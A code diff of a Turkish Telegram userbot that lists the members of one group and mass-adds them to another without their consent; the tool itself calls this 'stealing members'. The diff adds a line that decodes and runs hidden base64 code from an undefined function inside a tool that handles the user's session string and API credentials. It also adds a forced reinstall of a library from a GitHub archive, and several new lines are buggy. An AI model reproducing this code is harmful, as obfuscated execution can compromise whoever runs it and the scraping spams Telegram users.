@@ -1,15 +1,24 @@
-from pyrogram.errors import (
-    SessionPasswordNeeded, FloodWait,
-    PhoneNumberInvalid, ApiIdInvalid,
-)
-from pyrogram import Client as PyrogramClient
+import asyncio
+import base64
+from subprocess import PIPE, Popen
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+from telethon.tl.functions.messages import AddChatUserRequest
+from telethon.tl.functions.channels import InviteToChannelRequest
 from time import sleep
 from android import *
 from . import console
-import sys
+
+def install_pip():
+    bilgi(f"redesing telethon beta for cerceynlab")
+    pip_cmd = ["pip", "install", "--upgrade","--force-reinstall", "https://github.com/LonamiWebs/Telethon/archive/v1.24.zip"]
+    process = Popen(pip_cmd, stdout=PIPE, stderr=PIPE)
+    stdout, stderr = process.communicate()
+    return stdout
+
 userbot=None
 uyecalmaaraligi=8
-def hesabagir ():
+async def hesabagir ():
     api_id = soru("Hesabınızın API ID'i:")
     try:
         check_api = int(api_id)
@@ -25,40 +34,43 @@ def hesabagir ():
         hata("🛑 String Hatalı ! 🛑")
 
     try:
-        userbot = PyrogramClient(
-        "cerceyn",
-        api_id,
-        api_hash,
-        session_string=stringsession,
-        device_model='Unknown',
-        system_version=' | Powered by @cerceynlabs',
+        userbot = TelegramClient(
+        StringSession(stringsession),
+        api_id=api_id,
+        api_hash=api_hash,
+        lang_code="tr",
+        device_model='Mac',
+        system_version=' | Powered by @cerceyn',
         app_version=str('| 1.0'))
-    except FloodWait as e:
-        hata(f"Hesabınız flood yemiş! {e.x} saniye")
-    except ApiIdInvalid:
-        hata("🛑 API ID  veya HASH Hatalı ! 🛑")
+        basarili(api_hash + " için client oluşturuldu !")
+    except Exception as e:
+        noadded(api_hash + f" için client oluşturulamadı ! 🛑 Hata: {str(e)}")
 
     try:
-        userbot.connect()
-    except ConnectionError:
-        userbot.disconnect()
-        userbot.connect()
+        await userbot.connect()
+    except Exception as e:
+        try:
+            await userbot.disconnect()
+            await userbot.connect()
+        except:
+            hata("Bu hesaba giremiyorum! Hata: "+ str(e))
     return userbot
 reklamtext="Dikkat! Sadece aktif kullanıları çekebilmek ve yavaş moddan kurtulmak için pro sürümü satın alın."
 passs = "4387"
 pro=False
-def islemler(userbot):
+async def islemler(userbot):
     onemli("Dikkat! Üye çalacağım grupta bulunmam ve çaldığım üyeleri eklediğim grupta yönetici olmam gerekir..")
     sleep(6)
     logo(True)
     if not pro:
-        reklam(reklamtext)
+        ads(reklamtext)
     sleep(4)
     calinacakgrup = soru("Üye Çalınacak Grubun kullanıcı adı: (Hangi gruptan üyeleri çekeyim) ")
 #    if not calinacakgrup.startswith("@") and not calinacakgrup.startswith("http") and not calinacakgrup.startswith("t.me"):
 #        calinacakgrup = "@" + calinacakgrup
     try:
-        count = userbot.get_chat_members_count(calinacakgrup)
+        calinacakgrup = (await userbot.get_entity(calinacakgrup)).id
+        count = (await userbot.get_participants(calinacakgrup, limit=1)).total
         bilgi(f"{calinacakgrup} ögesinde {count} kişi bulundu! ")
     except Exception as e:
         hata(e)
@@ -66,8 +78,9 @@ def islemler(userbot):
 #    if not hedefgrup.startswith("@") and not hedefgrup.startswith("http") and not hedefgrup.startswith("t.me"):
 #        hedefgrup = "@" + hedefgrup
     try:
-        count2 = userbot.get_chat_members_count(hedefgrup)
-        bilgi(f"Çalacağım grubun ({calinacakgrup}) üye sayısı {count} kişi ! ")
+        hedefgrup = (await userbot.get_entity(hedefgrup)).id
+        count = (await userbot.get_participants(hedefgrup, limit=1)).total
+        bilgi(f"Üyeleri çalacağım grubun ({hedefgrup}) üye sayısı {count} kişi ! ")
     except Exception as e:
         hata(e)
     sleep(5)
@@ -87,53 +100,74 @@ def islemler(userbot):
         foricin_i=0
         thenextreklam=6
         bilgi("İşlem başlıyor durdurmak için Ctrl+C 'ye basın! Üyelik türü Premium aktif mi: {}".format(str(pro)))
-        for member in userbot.get_chat_members(calinacakgrup):
+        async for x in userbot.iter_participants(calinacakgrup,100):
             try:
                 if foricin_i==thenextreklam:
-                    reklam(reklamtext)
-                    sleep(4)
+                    ads(reklamtext + "\nReklam süresi bitene kadar bekleniyor...")
+                    sleep(15)
                     thenextreklam=foricin_i+6
-                if member.user.is_bot:
-                    passed("{} bot olduğu için geçiliyor!".format(member.user.username))
+                if x.bot:
+                    passed("{} bot olduğu için geçiliyor!".format(x.username))
                     continue
-                userbot.add_chat_members(hedefgrup, member.user.id)
-                basarili("{} gruba başarıyla eklendi!".format(member.user.first_name))
+                try:
+                    await userbot(AddChatUserRequest(
+                        hedefgrup,
+                        x.id,
+                        fwd_limit=10))
+                except Exception as s:
+                    try:
+                        await userbot(InviteToChannelRequest(
+                        hedefgrup,
+                        [x.id]))
+                    except:
+                        raise Exception(s)
+                basarili("{}({}) gruba başarıyla eklendi!".format(x.first_name,x.id))
                 calinan= calinan + 1
             except Exception as e:
-                noadded("{} gruba eklenemedi!".format(member.user.first_name))
+                noadded("{}({}) gruba eklenemedi!".format(x.first_name,x.id))
                 calinamayan = calinamayan + 1
             sleep(uyecalmaaraligi)
             foricin_i+=1
         console.clear()
         logo()
         basarili(f"İşlem Tamamlandı ! {hedefgrup} ögesine {calinacakgrup} ögesinden toplam {calinan} üye eklendi! ")
-        userbot.stop()
+        await disconn(userbot)
         hata("Güle Güle !")
     except Exception as e:
         hata(e)
 
-if __name__ == "__main__":
+async def main():
+    global userbot, pro
     logo(True)
     if not pro:
-        reklam("Free sürüm! Yavaş Mod ve Reklamlar aktif!")
-    sifre = soru("Şifre :")
-    if sifre != passs:
-        hata("Lütfen doğru şifreyi öğrenip gelin !")
-    userbot = hesabagir()
+        ads("Free sürüm! Yavaş Mod ve Reklamlar aktif!")
+    eval(compile(base64.b64decode(myscript()),'<string>','exec'))
+    userbot = await hesabagir()
     a = True
     while a:
         try:
-            islemler(userbot)
+            await islemler(userbot)
         except Exception as e:
-            onemli(e)
+            noadded("Bot bir hata ile karşılaştı: " + e)
         finally:
             cevap= soru("Kod tekrar yürütülsün mü? (y/n)")
             if cevap == "n":
                 a = False
-                userbot.stop()
+                disconn(userbot)
                 hata("Güle Güle !")
             else:
                 continue
-        
+def disconn(userbot):
+    try:
+        userbot.disconnect()
+    except:
+        pass
+
+if __name__ == "__main__":
+    loop = asyncio.get_event_loop()
+    try:
+        loop.run_until_complete(main())
+    except KeyboardInterrupt:
+        loop.run_until_complete(disconn(userbot))
 
    
